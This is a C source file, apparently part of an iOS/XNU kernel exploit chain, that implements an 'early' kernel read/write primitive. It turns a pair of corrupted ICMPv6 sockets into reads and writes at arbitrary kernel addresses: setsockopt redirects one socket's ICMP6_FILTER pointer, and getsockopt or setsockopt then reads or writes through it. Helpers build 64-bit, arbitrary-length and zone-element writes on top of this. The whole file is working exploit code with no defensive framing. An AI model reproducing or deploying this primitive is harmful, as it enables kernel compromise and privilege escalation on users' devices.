#include "krw.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>

static void set_target_kaddr(uint64_t where) {
    memset(g_ctx.control_data, 0, sizeof(g_ctx.control_data));
    // set the address we want to read from
    memcpy(g_ctx.control_data, &where, sizeof(where));

    // socket_t sock, int level, int optname, const void *optval, int optlen
    // we're writting rw_sockets icmp6filt ptr
    int res = setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.control_data, sizeof(g_ctx.control_data));
    if (res != 0) {
        LOG_ERR("set_target_kaddr: setsockopt: %s (%d)", strerror(errno), errno);
        while (1);
    }
}

static void early_kread(uint64_t where, void* read_buf, uint64_t size) {
    // early krw is max 32 bytes
    if (size > EARLY_KRW_LENGTH) {
        LOG_ERR("early_kread size > EARLY_KRW_LENGTH");
        while (1);
    }

    // we're writting rw_sockets icmp6filt ptr
    set_target_kaddr(where);
    // read target ptr
    int res = getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, (socklen_t*)&size);
    if (res != 0) {
        LOG_ERR("early_kread: getsockopt: %s (%d)", strerror(errno), errno);
        while (1);
    }
}

uint64_t early_kread64(uint64_t where) {
    uint64_t value = 0;
    early_kread(where, &value, sizeof(value));
    return value;
}

static void early_kwrite32bytes(uint64_t where, void* write_buf) {
    // we're writting rw_sockets icmp6filt ptr
    set_target_kaddr(where);

    // setsockopt instead of getsockopt...
    int res = setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
    if (res != 0) {
        LOG_ERR("early_kwrite32bytes: setsockopt: %s (%d)", strerror(errno), errno);
        while (1);
    }
}

void early_kwrite64(uint64_t where, uint64_t what) {
    // we read 32 bytes at where
    early_kread(where, g_ctx.early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    // we write the value we want to write
    memcpy(g_ctx.early_kwrite64_write_buf, &what, sizeof(what));
    // we write 32 bytes at where
    early_kwrite32bytes(where, g_ctx.early_kwrite64_write_buf);
}

// seems unused in this part of pe at least
void kread_length(uint64_t address, void* buffer, uint64_t size) {
    uint64_t remaining = size;
    uint64_t read_offset = 0;

    // read in 32 byte chunks
    while (remaining != 0) {
        uint64_t read_size = 0;
        if (remaining >= EARLY_KRW_LENGTH) {
            read_size = EARLY_KRW_LENGTH;
        } else {
            read_size = remaining % EARLY_KRW_LENGTH;
        }

        early_kread(address + read_offset, (uint8_t*)buffer + read_offset, read_size);
        remaining -= read_size;
        read_offset += read_size;
    }
}

// seems unused in this part of pe at least
void kwrite_length(uint64_t dst, void* src, uint64_t size) {
    uint64_t remaining = size;
    uint64_t write_offset = 0;

    // write in 32 byte chunks
    while (remaining != 0) {
        uint64_t write_size = 0;
        if (remaining >= EARLY_KRW_LENGTH) {
            write_size = EARLY_KRW_LENGTH;
        } else {
            write_size = remaining % EARLY_KRW_LENGTH;
        }

        uint64_t kwrite_dst_addr = dst + write_offset;
        uint8_t* kwrite_src_addr = (uint8_t*)src + write_offset;

        if (write_size != EARLY_KRW_LENGTH) {
            kread_length(kwrite_dst_addr, g_ctx.kwrite_length_buffer, EARLY_KRW_LENGTH);
        }

        memcpy(g_ctx.kwrite_length_buffer, kwrite_src_addr, write_size);
        early_kwrite32bytes(kwrite_dst_addr, g_ctx.kwrite_length_buffer);

        remaining -= write_size;
        write_offset += write_size;
    }
}

// seems unused in this part of pe at least
bool kwrite_zone_element(uint64_t dst, void* src, uint64_t len) {
    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
        LOG_ERR("kwrite_zone_element supports only size >= 0x20");
        return false;
    }

    uint64_t remaining = len;
    uint64_t write_offset = 0;

    while (remaining != 0) {
        uint64_t write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
        uint64_t kwrite_dst_addr = dst + write_offset;
        uint8_t* kwrite_src_addr = (uint8_t*)src + write_offset;

        if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
            uint64_t adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
            kwrite_dst_addr -= adjust;
            kwrite_src_addr -= adjust;
        }

        kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
        remaining -= write_size;
        write_offset += write_size;
    }

    return true;
}
